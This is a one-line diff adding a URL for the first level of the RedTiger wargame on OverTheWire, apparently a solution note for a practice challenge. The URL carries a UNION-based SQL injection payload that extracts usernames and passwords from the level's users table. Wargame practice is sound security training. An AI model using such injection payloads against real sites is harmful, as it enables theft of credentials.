@@ -1,0 +1,1 @@
+https://redtiger.labs.overthewire.org/level1.php?cat=0+UNION+SELECT+1,2,username,password+FROM+level1_users
